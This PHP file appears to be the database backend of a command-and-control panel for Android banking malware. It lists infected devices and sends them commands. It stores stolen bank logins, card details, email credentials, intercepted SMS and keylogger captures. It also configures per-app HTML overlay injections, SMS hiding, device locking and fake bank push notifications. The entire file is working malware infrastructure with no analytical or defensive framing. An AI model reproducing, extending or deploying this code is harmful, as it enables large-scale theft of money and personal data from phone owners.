<?php
define('server' , 'localhost');
define('user', 'root');
define('db', 'bbot');
define('passwd' , ''/*'350638'*/);
define('key' , 'test');
class database{

	static private $_connection = null;
	static function Connection()
	{
		if (!self::$_connection)
		{
			self::$_connection = new PDO('mysql:host='.server.';dbname='.db, user, passwd);
		}
		return self::$_connection;
	}

	function getBots($currentPage, $sorting, $limit){
		/*
		0 - online
		1 - offline
		2 - dead
		3 - Exist App Banks
		3 - No Exist App Banks
		5 - statBank==1
		6 - statCC==1
		7 - statMail==1
		*/
		$strMySQL = "SELECT * FROM bots ";//---Sorting---
		$paramsMySQL = "";
		if (preg_match('/1/', $sorting)) {
			$paramsMySQL = "WHERE ";
			if(substr($sorting,0,1)=="1"){//online
				$paramsMySQL  = $paramsMySQL."(TIMESTAMPDIFF(SECOND,`lastconnect`, now())<=120) AND ";
			}
			if(substr($sorting,1,1)=="1"){//offline
				$paramsMySQL  = $paramsMySQL."((TIMESTAMPDIFF(SECOND,`lastconnect`, now())>=121) AND (TIMESTAMPDIFF(SECOND,`lastconnect`, now())<=144000)) AND ";
			}
			if(substr($sorting,2,1)=="1"){//dead
				$paramsMySQL  = $paramsMySQL."(TIMESTAMPDIFF(SECOND,`lastconnect`, now())>=144001) AND ";
			}
			if(substr($sorting,3,1)=="1"){//install banks
				$paramsMySQL  = $paramsMySQL."(banks != '') AND ";
			}
			if(substr($sorting,4,1)=="1"){//no install banks
				$paramsMySQL  = $paramsMySQL."((banks = '') OR (banks IS NULL)) AND ";
			}
			if(substr($sorting,5,1)=="1"){//statBanks
				$paramsMySQL  = $paramsMySQL."(statBanks = '1') AND ";
			}
			if(substr($sorting,6,1)=="1"){//statCards
				$paramsMySQL  = $paramsMySQL."(statCards = '1') AND ";
			}
			if(substr($sorting,7,1)=="1"){//statMails
				$paramsMySQL  = $paramsMySQL."(statMails = '1') AND ";
			}
			if(substr($paramsMySQL, -5) == " AND " ){
				$paramsMySQL = substr($paramsMySQL,0,-5);
			}
		}
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$limitBots=(strlen($limit)>0)?$limit:10; //select data db!
		$countBots = $connection->query("SELECT COUNT(*) as count FROM bots $paramsMySQL")->fetchColumn();
		$pages = ceil($countBots / $limitBots);
		$startLimit = ($currentPage - 1) * $limitBots;
		//return  $strMySQL.$paramsMySQL." LIMIT $startLimit, $limitBots";
		$strMySQL = $strMySQL.$paramsMySQL." LIMIT $startLimit, $limitBots";

		$statement = $connection->prepare($strMySQL); 
		$statement->execute();
		$json = [
			"bots"=>[],
			"pages"=>$pages,
			"currentPage"=>$currentPage
		];
		$index = 0;
		
		foreach($statement as  $row){
			$secondsConnect = strtotime(date('Y-m-d H:i:s'))-strtotime($row['lastconnect']);
			$index++;
			$json['bots'] []= [
				'id' => $row['idbot'],
				'version' => $row['android'],
				'tag'=> $row['TAG'],
				'ip' => $row['ip'],
				'commands' => $row['commands'],
				'country' => $row['country'],
				'banks'=> $row['banks'],
				'lastConnect' => $secondsConnect,
				'dateInfection' => $row['date_infection'],
				'comment' => $row['comment'],
				'statScreen' => $row['statScreen'],
				'statAccessibility' => $row['statAccessibility'],
				'statProtect' => $row['statProtect'],
				'statCards' => $row['statCards'],
				'statBanks' => $row['statBanks'],
				'statMails' => $row['statMails'],
				'statAdmin' => $row['statAdmin']
			];
		}
		return json_encode($json);
	}

	private function tableExists($tblName)
	{
		$connection = self::Connection();
		$statement = $connection->prepare("SELECT COUNT(*) as cnt from INFORMATION_SCHEMA.TABLES where table_name = ?");	
		$statement->execute([$tblName]);
		$tableCount = $statement->fetchColumn();
		if ( $tableCount != 0 )
			return true;
		return false;
	}

	function statLogs($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');

		if ( !$this->tableExists("LogsSMS_$idbot") )
			return 0;

		$statement = $connection->prepare("SELECT COUNT(*) as cnt FROM LogsSMS_$idbot");//Logs Bot
		$statement->execute();
		$cnt = $statement->fetchColumn();
		return $cnt > 0 ? 1 : 0;
	}
	
	function statKeylogger($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');

		if ( !$this->tableExists("keylogger_$idbot") )
			return 0;

		$statement = $connection->prepare("SELECT COUNT(*) as cnt FROM keylogger_$idbot");//Logs Bot Keylogger
		$statement->execute();
		$cnt = $statement->fetchColumn();
		return $cnt > 0 ? 1 : 0;
	}

	function statLogsSMS($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT COUNT(logs) as cnt FROM logsBotsSMS WHERE idbot=?");//Logs Bot SMS
		$statement->execute([$idbot]);
		return $statement->fetchColumn();
	}
	
	function statLogsApp($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT COUNT(logs) as cnt FROM logsListApplications WHERE idbot= ? ");//Logs Bot App
		$statement->execute([$idbot]);
		return $statement->fetchColumn();
	}

	function statLogsNumber($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT COUNT(logs) as cnt FROM logsPhoneNumber WHERE idbot= ? ");//Logs Bot PhoneNumber
		$statement->execute([$idbot]);
		return $statement->fetchColumn();
	}


	function getBotsFull($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT * FROM bots WHERE idbot=? LIMIT 1");
		$statement->execute([$idbot]);
		
		$row = $statement->fetch();
		if (!$row)
			return json_encode(["error"=>"No Exist IDBOT"]);
		$secondsConnect = strtotime(date('Y-m-d H:i:s'))-strtotime($row['lastconnect']);
		$json = [
			'id'=>$row['idbot'],
			'version'=>$row['android'],
			'tag'=>$row['TAG'],
			'country'=>$row['country'],
			'banks' => $row['banks'],
			'lastConnect' =>$secondsConnect,
			'dateInfection'=>$row['date_infection'],
			'ip' => $row['ip'],
			'operator'=>$row['operator'],
			'model' => $row['model'],
			'phoneNumber'=>$row['phoneNumber'],
			'commands' => $row['commands'],
			'comment' => $row['comment'],
			'statProtect' => $row['statProtect'],
			'statScreen' => $row['statScreen'],
			'statAccessibility'=>$row['statAccessibility'],
			'statSMS' => $row['statSMS'],
			'statCards' => $row['statCards'],
			'statBanks' => $row['statBanks'],
			'statMails' => $row['statMails'],
			'activeDevice' => $row['activeDevice'],
			'timeWorking' => $row['timeWorking'],
			'statDownloadModule' => $row['statDownloadModule'],
			'statAdmin'=> $row['statAdmin'],
			'statLogs' => $this->statLogs($idbot),
			'statLogsSmsSaved' => $this->statLogsSMS($idbot),
			'statLogsApp' => $this->statLogsApp($idbot),
			'statLogsNumber' => $this->statLogsNumber($idbot),
			'statLogsKeylogger' => $this->statKeylogger($idbot),
			'locale' => $row ['locale'],
			'batteryLevel' => $row['batteryLevel'],
			'updateSettings' => $row['updateSettings']
		];
		return json_encode($json); 
	}

	function deleteBots($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$arrayIdBot = explode(",",$idbot);
		foreach($arrayIdBot as $id){
			if(!empty($id)){
				$statement = $connection->prepare("DELETE FROM bots WHERE idbot= ?");
				$statement->execute([$id]);

				$statement = $connection->prepare("DELETE FROM settingBots WHERE idbot=?");
				$statement->execute([$id]);
			}
		}
		return json_encode(['message'=>'ok']);
	}

	function mainStats(){
		/*
		Bots
		Online
		Offline
		Deads
		Banks
		CC
		Mails
		*/
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$countBots = $connection->query("SELECT COUNT(*) as count FROM bots")->fetchColumn();
		$online = $connection->query("SELECT COUNT(*) as count FROM bots WHERE (TIMESTAMPDIFF(SECOND,`lastconnect`, now())<=120)")->fetchColumn();
		$offline = $connection->query("SELECT COUNT(*) as count FROM bots WHERE ((TIMESTAMPDIFF(SECOND,`lastconnect`, now())>=121) AND (TIMESTAMPDIFF(SECOND,`lastconnect`, now())<=144000))")->fetchColumn();
		$dead = $connection->query("SELECT COUNT(*) as count FROM bots WHERE (TIMESTAMPDIFF(SECOND,`lastconnect`, now())>=144001)")->fetchColumn();
		$banks = $connection->query("SELECT COUNT(*) as count FROM logsBank")->fetchColumn();
		$cards = $connection->query("SELECT COUNT(*) as count FROM logsCC")->fetchColumn();
		$mails = $connection->query("SELECT COUNT(*) as count FROM logsMail")->fetchColumn();
		return json_encode([
			"bots"=>$countBots,
			"online"=>$online,
			"offline"=>$offline,
			"dead"=>$dead,
			"banks"=>$banks,
			"cards"=>$cards,
			"mails"=>$mails
		]);
	}

	function setCommand($idbot, $command){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$arrayIdBot = explode(",",$idbot);
		foreach($arrayIdBot as $id){
			if(!empty($id)){
				if(preg_match('/autopush/', base64_decode($command))) {
					$statement = $connection->prepare("SELECT * FROM bots WHERE idbot= ?");
					$statement->execute([$id]);
					$iconPush = "";
					foreach($statement as $row){
						$arrayBanks = explode(":",$row['banks']);
						if(empty($arrayBanks[0])){$iconPush = $arrayBanks[1];}else{$iconPush = $arrayBanks[0];}
					}
					if(!empty($iconPush)){
						//TODO WTF?
						$statement = $connection->prepare("SELECT pushTitle, pushText FROM settings WHERE 1");
						$statement->execute([$id]);
						foreach($statement as  $row){
							$command = base64_encode(
								json_encode([
									"name"=>"push",
									"app" => $iconPush,
									"title" => $row['pushTitle'],
									"text" => $row['pushText']
								])
							);
						}
					}
				}
				$statement = $connection->prepare("UPDATE bots SET commands = ? WHERE idbot=?");
				$statement->execute([$command,$id]);
			}
		}
		return json_encode(['message'=>'ok']);
	}

	function editComment($idbot, $comment){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("UPDATE bots SET comment = ? WHERE idbot=?");
		$statement->execute([ $comment,$idbot]);
		return json_encode(['message'=>'ok']);;
	}

	function editGlobalSettings($arrayUrl, $timeInject, $timeCC, $timeMail, $timeProtect,$updateTableBots, $pushTitle, $pushText){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		//WWWWWWAT THAT FUCK!!!!!!! OMFG. Clear its settings table!
		$saveID = $this->shapeSpace_random_string(15);
		$statement = $connection->prepare("UPDATE settings SET saveID = ?, arrayUrl = ?, timeInject = ?, timeCC = ?, timeMail = ?, timeProtect = ?, updateTableBots = ?, pushTitle = ?, pushText = ?  WHERE 1");
		$statement->execute(array($saveID ,$arrayUrl, $timeInject, $timeCC, $timeMail, $timeProtect, $updateTableBots, $pushTitle, $pushText));
		
		return json_encode(['message'=>'ok']);
	}

	function shapeSpace_random_string($length) {
		$characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";	
		$strlength = strlen($characters);
		$random = '';
		for ($i = 0; $i < $length; $i++) {
			$random .= $characters[rand(0, $strlength - 1)];
		}
		return $random;
	}

	function getGlobalSettings(){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$row = $connection->query("SELECT * FROM settings WHERE 1 LIMIT 1")->fetch();
		if (!$row)
			return json_encode(["error"=>"No Data Settings"]);

		return json_encode([
			'arrayUrl'=>$row['arrayUrl'],
			'timeInject' => $row['timeInject'],
			'timeCC' => $row['timeCC'],
			'timeMail' => $row['timeMail'],
			'timeProtect' => $row['timeProtect'],
			'updateTableBots' => $row['updateTableBots'],
			'pushTitle' => $row['pushTitle'],
			'pushText' => $row['pushText'],
			'key' => key
		]);
	}
	
	function editBotSettings($idbot, $hideSMS, $lockDevice, $offSound, $keylogger,$activeInjection){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("UPDATE settingBots SET hideSMS = ?, lockDevice = ?, offSound = ?, keylogger = ?, activeInjection = ?  WHERE idbot=?");
		$statement->execute([$hideSMS, $lockDevice, $offSound, $keylogger,$activeInjection, $idbot]);
		$statement = $connection->prepare("UPDATE bots SET updateSettings = '1' WHERE idbot=?");
		$statement->execute([$idbot]);
		return json_encode(['message'=>'ok']);
	}

	function getBotSettings($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$logs = [

		];
		$statement = $connection->prepare("SELECT * FROM settingBots WHERE idbot= ? ");
		$statement->execute([$idbot]);
		foreach($statement as  $row){
			$activeInjection = $row['activeInjection'];
			if(substr($activeInjection, 0, 1)==':'){
				$activeInjection = substr($activeInjection, 1);
			}

			$logs["hideSMS"]= $row['hideSMS'];
			$logs["lockDevice"] = $row['lockDevice'];
			$logs["offSound"] = $row['offSound'];
			$logs["keylogger"] = $row['keylogger'];
			$logs["activeInjection"] = $activeInjection;
		}
		$statement = $connection->prepare("SELECT * FROM bots WHERE idbot= ? ");
		$statement->execute([$idbot]);
		if(!empty($logs)){
			foreach($statement as $row){
				$banks = $row['banks'];
				if(substr($banks, 0, 1)==':'){
					$banks = 'grabCC:grabMails'.$banks;
				}else{
					$banks = 'grabCC:grabMails:'.$banks;
				}
				$logs['banks'] = $banks;
				return json_encode($logs);
			}
		}
		return json_encode(["error"=>"No Data Settings bot"]);
	}

	function getLogsInjections($nameTable, $idbot){ 
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$TableIDbot = "";

		if ( !$this->tableExists($nameTable))
			return json_encode(["error"=>"No Have table - WTF? "]);

		$statement = $connection->prepare("SELECT * FROM $nameTable WHERE ISNULL( ? ) or idbot = ? ");
		$statement->execute([$idbot,$idbot]);
		if ( $statement->rowCount() == 0 )
			json_encode(['error'=>'No Have Bank Logs']);

		$json = [ $nameTable.'s' => []];
		foreach($statement as  $row){
			$json[$nameTable.'s'] []= [
				'idinj'=>$row['idinj'],
				'idbot'=>$row['idbot'],
				'application' =>$row['application'],
				'logs'=> $row['logs'],
				'comment'=>$row['comment']
			];
		}
		return json_encode($json);
	}

	function editCommentLogsInjections($nameTable, $idinj, $comment){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');

		if ( !$this->tableExists($nameTable))
			return json_encode(["error"=>"No Have table - WTF? "]);

		$statement = $connection->prepare("UPDATE $nameTable SET comment = ? WHERE idinj = ?");
		$statement->execute(array($comment, $idinj));
		return json_encode(['message'=>'ok']);
	}

	function deleteLogsInjections($nameTable, $idinj){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("DELETE FROM $nameTable WHERE idinj = ?");
		$statement->execute([$idinj]);
		return json_encode(['message'=>'ok']);
	}

	function getHtmlInjection(){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT * FROM dataInjections");
		$statement->execute();
		$json = ["dataInjections"=>[]]; 
			foreach($statement as  $row){
				$json['dataInjections'] []= [
					'app'=>$row['app'],
					'html'=>(strlen($row['html'])>=10 ? "1" : "0"),
					'icon'=>(strlen($row['icon'])>=10 ? "1" : "0")
				];
			}
			return json_encode($json);	
	}

	function addHtmlInjection($app, $html, $icon){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT COUNT(app) as cnt FROM dataInjections WHERE app = ?");
		$statement->execute([$app]);
		if ( $statement->fetchColumn() )
			return json_encode(['error'=>'App Exist']);

		
		$statement = $connection->prepare("INSERT INTO dataInjections (app, html, icon) VALUE ( ?, ?, ?)");
		$statement->execute([$app, $html, $icon]);
		return json_encode(['message'=>'ok']);
	}

	function deleteHtmlInjection($app){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("DELETE FROM dataInjections WHERE app = ?");
		$statement->execute([$app]);
		return json_encode(['message'=>'ok']);
	}

	function getLogsSMS($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');

		if (!$this->tableExists("LogsSMS_$idbot"))
			return json_encode(["error"=>"No table"]);

		$statement = $connection->prepare("SELECT * FROM LogsSMS_$idbot");
		$statement->execute([]);
		if ($statement->rowCount() == 0)
			return json_encode(["error"=>"No exist"]);
		$json = ['sms'=>[]];
		foreach($statement as  $row){
			$json['sms'] []= [
				'logs'=>$row['logs'],
				'datetoserver' => $row['datetoserver'],
				'datetodevice'=> $row['datetodevice']
			];
		}
		return json_encode($json);	
	}

	function deleteTable($nameTable){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("DROP TABLE $nameTable");
		$statement->execute();
		return json_encode(['message'=>'ok']);
	}

	function getLogsKeylogger($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');

		if (!$this->tableExists("keylogger_$idbot"))
			return json_encode(["error"=>"No table"]);

		$statement = $connection->prepare("SELECT logs FROM keylogger_$idbot");
		$statement->execute([]);
		if ($statement->rowCount() == 0)
			return json_encode(["error"=>"No exist"]);

		$json = []; 
		foreach($statement as  $row){
			$json []= $row['logs'];	
		}
		return json_encode($json);	
	}



	function getLogsBots($table, $idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');

		if (!$this->tableExists($table))
			return json_encode(["error"=>"No table"]);

		$statement = $connection->prepare("SELECT logs FROM $table WHERE idbot=?");
		$statement->execute([$idbot]);

		if ($statement->rowCount() == 0)
			return json_encode(["error"=>"No exist"]);

		$json = []; 
			foreach($statement as  $row){
				$arrayLine = explode(":end:", base64_decode($row['logs']));
				foreach($arrayLine as $line){
					if(!empty($line)){
						$json []= base64_encode($line) ;
					}
				}
			}
			return json_encode($json);	
	}

	function delLogsBots($table, $idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');

		if (!$this->tableExists($table))
			return json_encode(["error"=>"No table"]);

		$statement = $connection->prepare("DELETE FROM $table WHERE idbot = ?");
		$statement->execute([$idbot]);
		return json_encode(['message'=>'ok']);
	}

}
